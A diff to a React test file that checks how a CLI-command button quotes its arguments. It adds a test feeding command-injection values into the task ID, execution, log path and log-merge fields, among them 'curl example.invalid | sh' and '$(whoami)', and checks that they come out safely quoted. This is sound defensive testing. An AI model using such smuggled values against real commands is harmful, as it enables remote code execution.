@@ -96,7 +96,7 @@ describe("CliCommandButton", () => {
         { wrapper },
       );
 
-      const command = `evergreen task build TaskLogs --task_id task-abc --execution 2 --type ${expectedType} --o output.txt`;
+      const command = `evergreen task build TaskLogs --task_id 'task-abc' --execution '2' --type ${expectedType} --o output.txt`;
       expect(screen.getByText(command)).toBeInTheDocument();
     },
   );
@@ -114,7 +114,7 @@ describe("CliCommandButton", () => {
       { wrapper },
     );
     const command =
-      "evergreen task build TestLogs --task_id spruce_ubuntu_check_codegen_1234 --execution 1 --log_path AFakeTest --o output.txt";
+      "evergreen task build TestLogs --task_id 'spruce_ubuntu_check_codegen_1234' --execution '1' --log_path 'AFakeTest' --o output.txt";
     expect(screen.getByText(command)).toBeInTheDocument();
   });
 
@@ -132,7 +132,25 @@ describe("CliCommandButton", () => {
       { wrapper },
     );
     const command =
-      "evergreen task build TestLogs --task_id spruce_ubuntu_check_codegen_1234 --execution 1 --log_path AFakeTest --logs_to_merge log-a --logs_to_merge log-b --o output.txt";
+      "evergreen task build TestLogs --task_id 'spruce_ubuntu_check_codegen_1234' --execution '1' --log_path 'AFakeTest' --logs_to_merge 'log-a' --logs_to_merge 'log-b' --o output.txt";
+    expect(screen.getByText(command)).toBeInTheDocument();
+  });
+
+  it("quotes shell metacharacters in all dynamic command arguments", () => {
+    render(
+      <WithLogMetadata
+        metadata={{
+          execution: "0; curl example.invalid | sh",
+          logPath: "suite; $(whoami)",
+          logType: LogTypes.EVERGREEN_TEST_LOGS,
+          logsToMerge: ["log; echo injected", "log'with-quote"],
+          taskID: "task; curl example.invalid | sh",
+        }}
+      />,
+      { wrapper },
+    );
+    const command =
+      "evergreen task build TestLogs --task_id 'task; curl example.invalid | sh' --execution '0; curl example.invalid | sh' --log_path 'suite; $(whoami)' --logs_to_merge 'log; echo injected' --logs_to_merge 'log'\"'\"'with-quote' --o output.txt";
     expect(screen.getByText(command)).toBeInTheDocument();
   });
 });
